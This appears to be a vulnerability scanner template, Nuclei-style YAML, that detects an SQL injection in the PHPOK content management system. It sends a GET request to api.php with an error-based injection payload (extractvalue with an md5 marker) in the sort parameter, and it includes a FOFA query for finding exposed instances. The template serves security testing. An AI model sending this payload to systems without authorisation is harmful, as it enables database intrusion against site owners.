id: phpok-sqli
info:
  author: ritikchaddha
  metadata:
    fofa-query: app="phpok"
    verified: true
  name: PHPOK - Sql Injection
  severity: high
  tags: phpok,sqli
requests:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5({{num}})}}'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}})))
    --+'
variables:
  num: '999999999'
